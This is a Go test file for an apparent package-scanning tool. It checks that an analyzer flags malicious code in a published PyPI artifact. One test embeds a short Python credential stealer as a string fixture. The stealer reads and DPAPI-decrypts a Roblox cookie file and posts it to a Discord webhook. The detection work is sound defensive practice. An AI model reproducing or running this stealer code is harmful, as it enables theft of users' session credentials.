package source

import (
	"iter"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

func seqFiles(files ...astfeature.SourceFile) iter.Seq2[astfeature.SourceFile, error] {
	return func(yield func(astfeature.SourceFile, error) bool) {
		for _, f := range files {
			if !yield(f, nil) {
				return
			}
		}
	}
}

// TestAnalyzeArtifactSource_SpadataConcernFires runs the in-situ concern
// over the PUBLISHED artifact's source rather than the git clone: a
// spadata-shaped __init__.py through the real analyzer must fire concern
// naming the credential-store read and the DPAPI decrypt. This is the
// path that catches a payload shipped in the registry artifact but
// absent from (or lacking) a source repo — invisible to the clone-based
// matrix.
func TestAnalyzeArtifactSource_SpadataConcernFires(t *testing.T) {
	t.Parallel()
	src := "" +
		"import os, base64, requests\n" +
		"from win32crypt import CryptUnprotectData\n" +
		"blob = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Roblox', 'LocalStorage', 'robloxcookies.dat'), 'rb').read()\n" +
		"cookie = CryptUnprotectData(base64.b64decode(blob))[1]\n" +
		"requests.post('https://discord.com/api/webhooks/1/x', json={'c': cookie})\n"

	counts, concern, supported, err := analyzeArtifactSource(t.Context(), "pypi", "0.1.1",
		seqFiles(astfeature.SourceFile{Path: "spadata-0.1.1/spadata/__init__.py", Content: []byte(src)}))
	require.NoError(t, err)
	require.True(t, supported)
	assert.GreaterOrEqual(t, counts.SensitivePathReads, 1)
	assert.GreaterOrEqual(t, counts.CredentialDecryptCalls, 1)
	assert.True(t, concern.ConcernPresent)
	assert.Contains(t, concern.ConcerningFeatures, "sensitive_path_reads")
	assert.Contains(t, concern.ConcerningFeatures, "credential_decrypt_calls")
	assert.Equal(t, "0.1.1", concern.FirstConcernVersion)
}

func TestAnalyzeArtifactSource_UnsupportedEcosystemSkips(t *testing.T) {
	t.Parallel()
	_, _, supported, err := analyzeArtifactSource(t.Context(), "maven", "1.0", seqFiles())
	require.NoError(t, err)
	assert.False(t, supported, "an ecosystem with no analyzer must report unsupported, not fail")
}

func TestAnalyzeArtifactSource_BenignScoresNoConcern(t *testing.T) {
	t.Parallel()
	counts, concern, supported, err := analyzeArtifactSource(t.Context(), "pypi", "1.0.0",
		seqFiles(astfeature.SourceFile{Path: "pkg/core.py", Content: []byte(
			"import json\n\ndef parse(s):\n    return json.loads(s)\n")}))
	require.NoError(t, err)
	require.True(t, supported)
	assert.False(t, concern.ConcernPresent)
	assert.Equal(t, astfeature.Counts{}, counts)
}
